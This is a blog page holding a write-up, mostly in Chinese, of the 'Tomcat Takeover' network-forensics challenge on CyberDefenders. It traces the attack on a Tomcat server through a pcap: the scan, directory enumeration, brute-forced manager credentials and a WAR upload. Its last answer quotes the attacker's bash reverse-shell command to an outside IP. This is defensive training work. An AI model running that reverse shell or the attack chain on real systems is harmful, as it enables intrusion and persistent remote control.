<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  CyberDefender - Tomcat Takeover
  #

Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/135#nav-questions
:::spoiler TOC
[TOC]
:::

  Scenario
  #


Our SOC team has detected suspicious activity on one of the web servers within the company&rsquo;s intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/cyberdefender/network-forensic/cyberdefender---tomcat-takeover/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="CyberDefender - Tomcat Takeover"><meta property="og:description" content="CyberDefender - Tomcat Takeover # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/135#nav-questions
:::spoiler TOC [TOC] :::
Scenario # Our SOC team has detected suspicious activity on one of the web servers within the company’s intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CyberDefender"><meta property="article:tag" content="Network Forensics"><title>CyberDefender - Tomcat Takeover | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/cyberdefender/network-forensic/cyberdefender---tomcat-takeover/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>CyberDefender - Tomcat Takeover</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#scenario>Scenario</a></li><li><a href=#q1>==Q1==</a><ul><li><a href=#recon>Recon</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#q2>==Q2==</a><ul><li><a href=#recon-1>Recon</a></li><li><a href=#exploit-1>Exploit</a></li></ul></li><li><a href=#q3>==Q3==</a><ul><li><a href=#recon-2>Recon</a></li></ul></li><li><a href=#q4>==Q4==</a><ul><li><a href=#recon-3>Recon</a></li><li><a href=#exploit-2>Exploit</a></li></ul></li><li><a href=#q5>==Q5==</a><ul><li><a href=#recon-4>Recon</a></li><li><a href=#exploit-3>Exploit</a></li></ul></li><li><a href=#q6>==Q6==</a><ul><li><a href=#recon-5>Recon</a></li><li><a href=#exploit-4>Exploit</a></li></ul></li><li><a href=#q7>==Q7==</a><ul><li><a href=#recon-6>Recon</a></li><li><a href=#exploit-5>Exploit</a></li></ul></li><li><a href=#q8>==Q8==</a><ul><li><a href=#recon-7>Recon</a></li><li><a href=#exploit-6>Exploit</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=cyberdefender---tomcat-takeover>CyberDefender - Tomcat Takeover
<a class=anchor href=#cyberdefender---tomcat-takeover>#</a></h1><p>Challenge: <a href=https://cyberdefenders.org/blueteam-ctf-challenges/135#nav-questions>https://cyberdefenders.org/blueteam-ctf-challenges/135#nav-questions</a></p><p>:::spoiler TOC
[TOC]
:::</p><h2 id=scenario>Scenario
<a class=anchor href=#scenario>#</a></h2><blockquote><p>Our SOC team has detected suspicious activity on one of the web servers within the company&rsquo;s intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further.</p></blockquote><h2 id=q1>==Q1==
<a class=anchor href=#q1>#</a></h2><blockquote><p>Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?</p></blockquote><h3 id=recon>Recon
<a class=anchor href=#recon>#</a></h3><p>直覺就是先看endpoint或conversation</p><h3 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h3><p>可以看到==14.0.0.120==和內網的<code>10.0.0.112</code>，代表前者應該就是此次的外部攻擊者
<img src=https://hackmd.io/_uploads/HkPNR5tUp.png alt=image></p><p>:::spoiler Flag
Flag: <code>14.0.0.120</code>
:::</p><h2 id=q2>==Q2==
<a class=anchor href=#q2>#</a></h2><blockquote><p>Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker&rsquo;s activities originated?</p></blockquote><h3 id=recon-1>Recon
<a class=anchor href=#recon-1>#</a></h3><p>找到IP後丟到whois看detailed info</p><h3 id=exploit-1>Exploit
<a class=anchor href=#exploit-1>#</a></h3><p>這一題問的是city，不是province，所以要填廣州，不是廣東
<img src=https://hackmd.io/_uploads/HJakbiFIT.png alt=image></p><p>:::spoiler Flag
Flag: <code>Guangzhou</code>
:::</p><h2 id=q3>==Q3==
<a class=anchor href=#q3>#</a></h2><blockquote><p>From the pcap analysis, multiple open ports were detected as a result of the attacker&rsquo;s activitie scan. Which of these ports provides access to the web server admin panel?</p></blockquote><h3 id=recon-2>Recon
<a class=anchor href=#recon-2>#</a></h3><p>隨便猜</p><p>:::spoiler Flag
Flag: <code>8080</code>
:::</p><h2 id=q4>==Q4==
<a class=anchor href=#q4>#</a></h2><blockquote><p>Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?</p></blockquote><h3 id=recon-3>Recon
<a class=anchor href=#recon-3>#</a></h3><p>這一題直接問chat-gpt，因為工具太多了，乾脆直接問AI最快</p><h3 id=exploit-2>Exploit
<a class=anchor href=#exploit-2>#</a></h3><p><a href=https://chat.openai.com/share/72f8bf09-7c96-46c6-87a4-96b2e27e1f80>ChatGPT Answer</a></p><blockquote><p>Dirb / Dirbuster / Gobuster / Dirsearch:</p><ul><li>These tools are designed to brute-force directories and files on web servers by making requests with different wordlists.</li></ul></blockquote><p>:::spoiler Flag
Flag: <code>Gobuster</code>
:::</p><h2 id=q5>==Q5==
<a class=anchor href=#q5>#</a></h2><blockquote><p>Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover?</p></blockquote><h3 id=recon-4>Recon
<a class=anchor href=#recon-4>#</a></h3><p>這一題是從tcp flow中的transport file，慢慢回推回去tcp stream再詳細看其中的packet，因為根據題目敘述，它應該是狂送一大堆封包去爆目錄，所以我們只要往大方向觀察就知道大概在哪一段</p><h3 id=exploit-3>Exploit
<a class=anchor href=#exploit-3>#</a></h3><p>根據extracted file的內容，在#20649附近的stream已經可以拿到reverse shell了，代表從這邊往前可能是個不錯的選擇
<img src=https://hackmd.io/_uploads/ByRj4ot8a.png alt=image>
果不其然，它的順序一定是先爆路徑，之後再想怎麼塞reverse shell，所以從下圖可以知道有一大堆的404 error request，跟著他的stream就可以看到最重要的那個sub-path
<img src=https://hackmd.io/_uploads/H1YNVjKIa.png alt=image>
又題目說到該頁面是個admin panel，代表應該是個可以登入做authentication的地方，所以後續看到的第一個status code 200的/example就不是我們的目標，而是再更後面的==/manager==，因為它有login stage
<img src=https://hackmd.io/_uploads/H1CjUsK8a.png alt=image></p><p>:::spoiler Flag
Flag: <code>/manager</code>
:::</p><h2 id=q6>==Q6==
<a class=anchor href=#q6>#</a></h2><blockquote><p>Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization?</p></blockquote><h3 id=recon-5>Recon
<a class=anchor href=#recon-5>#</a></h3><p>呈上題，拿到登入頁面當然就是要爆帳密，所以往後面的stream看可以發現有很多嘗試login的request，但都是401 Unauthorized</p><h3 id=exploit-4>Exploit
<a class=anchor href=#exploit-4>#</a></h3><p>從下圖可以發現，往後刷幾個packets就有一個status 200的response，也就是attacker成功嘗試登入的response，從這邊把credential抓到base64 decode就會發現帳密
<img src=https://hackmd.io/_uploads/HyM5DoYUT.png alt=image></p><p>:::spoiler Flag
Flag: <code>admin:tomcat</code>
:::</p><h2 id=q7>==Q7==
<a class=anchor href=#q7>#</a></h2><blockquote><p>Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?</p></blockquote><h3 id=recon-6>Recon
<a class=anchor href=#recon-6>#</a></h3><p>往後看tcp stream會發現manager有upload的功能，所以attacker嘗試上傳一些東西，應該是一個zip file</p><h3 id=exploit-5>Exploit
<a class=anchor href=#exploit-5>#</a></h3><p><img src=https://hackmd.io/_uploads/BJCtKjF8T.png alt=image></p><p>:::spoiler Flag
Flag: <code>jxqozy.war</code>
:::</p><h2 id=q8>==Q8==
<a class=anchor href=#q8>#</a></h2><blockquote><p>Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?</p></blockquote><h3 id=recon-7>Recon
<a class=anchor href=#recon-7>#</a></h3><p>再往後看同一個stream的其他packet，發現server response 200，上傳成功後就可以直接進入reverse shell，接著就是看它的指令，發現他想要常駐在該台電腦上</p><h3 id=exploit-6>Exploit
<a class=anchor href=#exploit-6>#</a></h3><p><img src=https://hackmd.io/_uploads/B12M5stLa.png alt=image></p><p>:::spoiler Flag
Flag: <code>/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&amp;1'</code>
:::</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#scenario>Scenario</a></li><li><a href=#q1>==Q1==</a><ul><li><a href=#recon>Recon</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#q2>==Q2==</a><ul><li><a href=#recon-1>Recon</a></li><li><a href=#exploit-1>Exploit</a></li></ul></li><li><a href=#q3>==Q3==</a><ul><li><a href=#recon-2>Recon</a></li></ul></li><li><a href=#q4>==Q4==</a><ul><li><a href=#recon-3>Recon</a></li><li><a href=#exploit-2>Exploit</a></li></ul></li><li><a href=#q5>==Q5==</a><ul><li><a href=#recon-4>Recon</a></li><li><a href=#exploit-3>Exploit</a></li></ul></li><li><a href=#q6>==Q6==</a><ul><li><a href=#recon-5>Recon</a></li><li><a href=#exploit-4>Exploit</a></li></ul></li><li><a href=#q7>==Q7==</a><ul><li><a href=#recon-6>Recon</a></li><li><a href=#exploit-5>Exploit</a></li></ul></li><li><a href=#q8>==Q8==</a><ul><li><a href=#recon-7>Recon</a></li><li><a href=#exploit-6>Exploit</a></li></ul></li></ul></nav></div></aside></main></body></html>